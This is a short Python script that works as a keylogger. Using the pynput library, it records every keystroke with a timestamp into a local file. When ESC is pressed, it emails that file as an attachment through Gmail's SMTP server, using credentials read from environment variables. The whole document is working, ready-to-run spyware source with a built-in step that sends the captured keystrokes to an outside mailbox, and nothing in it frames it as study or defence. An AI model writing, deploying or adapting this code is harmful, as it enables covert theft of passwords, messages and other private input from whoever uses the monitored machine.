from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv
import os
load_dotenv()

def logger(key) :
    with open("data.txt", 'a') as log :
        time = datetime.now().strftime("%Y-%m-%d, %H:%M:%S")
        try :
            log.write(f"{time} - {key}\n")
        except :
            log.write(f"{time} - {key}\n")

        if key == keyboard.Key.esc :
            print("Email is being sent ...")
            # Configuration
            sender_email = os.getenv("SENDER_EMAIL")
            receiver_email = os.getenv("RECEIVER_EMAIL")
            password = os.getenv("PASSWORD")  # app password

            # Email header
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = "Automated File Delivery"

            # Email body
            body = "Check the file for data."
            message.attach(MIMEText(body, "plain"))

            # File attachment
            filename = "data.txt"  # Ensure this file is in the same folder

            try:
                with open(filename, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())

                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename= {filename}")
                message.attach(part)

                # Sending the Email
                # Use smtp.gmail.com for Gmail or smtp-mail.outlook.com for Outlook
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, receiver_email, message.as_string())
                
                print("Email sent successfully !!")

            except FileNotFoundError:
                print("The file was not found. Check the path.")
            except Exception as e:
                print(f"Error: {e}")
            return False

if __name__ == "__main__" :
    print("keylogger started (press ESC to stop)")
    listener = keyboard.Listener(on_press=logger)
    listener.start()
    listener.join()
